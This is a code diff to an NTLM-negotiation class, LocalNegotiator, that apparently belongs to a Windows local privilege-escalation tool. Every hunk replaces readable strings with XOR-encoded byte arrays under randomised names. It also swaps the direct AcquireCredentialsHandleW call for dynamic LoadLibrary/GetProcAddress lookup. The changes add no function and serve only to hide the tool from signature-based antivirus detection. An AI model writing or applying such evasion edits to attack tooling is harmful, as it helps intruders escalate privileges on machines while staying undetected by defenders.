@@ -20,10 +20,31 @@ void InitTokenContextBuffer(PSecBufferDesc pSecBufferDesc, PSecBuffer pSecBuffer
 
 int LocalNegotiator::handleType1(char * ntlmBytes, int len)
 {
-	TCHAR lpPackageName[1024] = L"Negotiate";
+	
+	 char  hid_Error__YMkdo9cbM0He[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x2c','\x2b','\x65','\x4','\x34','\x30','\x2c','\x37','\x20','\x6','\x37','\x20','\x21','\x20','\x2b','\x31','\x2c','\x24','\x29','\x36','\xd','\x24','\x2b','\x21','\x29','\x20','\x45'};
+ char k_nbGPLGkhofpT = '\x45';
+for(int i = 0; i < sizeof(hid_Error__YMkdo9cbM0He) / sizeof(hid_Error__YMkdo9cbM0He[0]); i++){
+hid_Error__YMkdo9cbM0He[i] = hid_Error__YMkdo9cbM0He[i] ^ k_nbGPLGkhofpT;
+}
+	typedef SECURITY_STATUS(__stdcall* _AcquireCredentialsHandleW)(LPWSTR pPrincipal,LPWSTR pPackage,unsigned long    fCredentialUse,void             *pvLogonId,void             *pAuthData,SEC_GET_KEY_FN   pGetKeyFn,void             *pvGetKeyArgument,PCredHandle      phCredential,PTimeStamp       ptsExpiry);
+	TCHAR  hid_Secur__sFBv4Ot2rPe0[] = {'\x16','\x20','\x26','\x30','\x37','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
+TCHAR k_XmHRcmgD4KiS = '\x45';
+for(int i = 0; i < sizeof(hid_Secur__sFBv4Ot2rPe0) / sizeof(hid_Secur__sFBv4Ot2rPe0[0]); i++){
+hid_Secur__sFBv4Ot2rPe0[i] = hid_Secur__sFBv4Ot2rPe0[i] ^ k_XmHRcmgD4KiS;
+}
+
+	HMODULE hid_hHandl_LreFVcujRQ0U = LoadLibrary(hid_Secur__sFBv4Ot2rPe0);
+	char  hid_Acquir_98niko6roDd9[] = {'\x4','\x26','\x34','\x30','\x2c','\x37','\x20','\x6','\x37','\x20','\x21','\x20','\x2b','\x31','\x2c','\x24','\x29','\x36','\xd','\x24','\x2b','\x21','\x29','\x20','\x12','\x45'};
+char k_hOiG9JwOCWVk = '\x45';
+for(int i = 0; i < sizeof(hid_Acquir_98niko6roDd9) / sizeof(hid_Acquir_98niko6roDd9[0]); i++){
+hid_Acquir_98niko6roDd9[i] = hid_Acquir_98niko6roDd9[i] ^ k_hOiG9JwOCWVk;
+}
+
+	_AcquireCredentialsHandleW hid_Acquir_I2KmaZGYY2ez = (_AcquireCredentialsHandleW) GetProcAddress(hid_hHandl_LreFVcujRQ0U, hid_Acquir_98niko6roDd9);
+TCHAR lpPackageName[1024] = L"Negotiate";
 	TimeStamp ptsExpiry;
 
-	int status = AcquireCredentialsHandleW(
+	int status = hid_Acquir_I2KmaZGYY2ez(
 		NULL,
 		lpPackageName,
 		SECPKG_CRED_INBOUND,
@@ -36,7 +57,7 @@ int LocalNegotiator::handleType1(char * ntlmBytes, int len)
 
 	if (status != SEC_E_OK)
 	{
-		printf("Error in AquireCredentialsHandle");
+		printf(hid_Error__YMkdo9cbM0He);
 		return -1;
 	}
 
@@ -68,7 +89,13 @@ int LocalNegotiator::handleType1(char * ntlmBytes, int len)
 
 int LocalNegotiator::handleType2(char * ntlmBytes, int len)
 {
-	char* newNtlmBytes = (char*)secServerBuffer.pvBuffer;
+	
+	 char  hid_Buffer_som2rrcMkW2U[] = {'\x7','\x30','\x23','\x23','\x20','\x37','\x65','\x36','\x2c','\x3f','\x20','\x36','\x65','\x2c','\x2b','\x26','\x2a','\x28','\x35','\x24','\x31','\x2c','\x27','\x29','\x20','\x65','\x68','\x65','\x26','\x24','\x2b','\x62','\x31','\x65','\x37','\x20','\x35','\x29','\x24','\x26','\x20','\x45'};
+ char k_7NJ5Bmtlpy1y = '\x45';
+for(int i = 0; i < sizeof(hid_Buffer_som2rrcMkW2U) / sizeof(hid_Buffer_som2rrcMkW2U[0]); i++){
+hid_Buffer_som2rrcMkW2U[i] = hid_Buffer_som2rrcMkW2U[i] ^ k_7NJ5Bmtlpy1y;
+}
+char* newNtlmBytes = (char*)secServerBuffer.pvBuffer;
 	if (len >= secServerBuffer.cbBuffer) {
 		for (int i = 0; i < len; i++)
 		{
@@ -81,7 +108,7 @@ int LocalNegotiator::handleType2(char * ntlmBytes, int len)
 		}
 	}
 	else {
-		printf("Buffer sizes incompatible - can't replace");
+		printf(hid_Buffer_som2rrcMkW2U);
 	}
 
 	return 0;
